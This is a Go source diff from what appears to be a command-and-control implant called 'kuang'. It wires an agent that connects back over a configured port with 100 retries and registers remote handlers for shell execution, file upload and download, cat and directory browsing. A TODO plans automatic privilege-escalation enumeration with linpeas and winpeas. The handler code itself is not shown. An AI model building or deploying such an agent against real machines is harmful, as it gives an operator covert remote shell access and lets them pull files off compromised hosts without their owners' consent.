@@ -7,7 +7,7 @@ import (
 	"os/signal"
 
 	"konstantinovitz.com/kuang/internal/agent"
-	"konstantinovitz.com/kuang/internal/utils"
+	"konstantinovitz.com/kuang/internal/commands"
 )
 
 func main() {
@@ -27,15 +27,25 @@ func main() {
 		LPORT: *lport,
 	}
 
-	commandManager := utils.NewCommandManager()
-	// commandManager.RegisterHandler("ping", handlePing)
-	// commandManager.RegisterDefaultHandler(handleShellExec)
+	// TODO: detect OS and build correct CommandManager, ie. sysenum command runs lipeas on linux and winpeas on windows
+	// TODO: note that this will increase the binary size compared to totally separate linux and windows builds, but who cares??
+	cm := commands.NewCommandManager()
+	cm.RegisterHandler("ping", commands.HandlePing)
+	cm.RegisterHandler("download", commands.HandleDownloadFile)
+	cm.RegisterHandler("upload", commands.HandleUploadFile)
+	cm.RegisterHandler("cd", commands.HandleChangeDir)
+	cm.RegisterHandler("cat", commands.HandleCat)
+	cm.RegisterHandler("sh", commands.HandleRunShellCommand)
+	cm.RegisterHandler("ls", commands.HandleLS)
+	cm.RegisterHandler("mkdir", commands.HandleMakeDirectory)
+	cm.RegisterHandler("pwd", commands.HandlePWD)
+	cm.RegisterHandler("clear", commands.HandleClear)
 
 	agent := &agent.Agent{
 		Transport:      agentTransport,
 		MaxRetries:     100,
 		BaseDelay:      1,
-		CommandManager: *commandManager,
+		CommandManager: cm,
 	}
 
 	go func() {
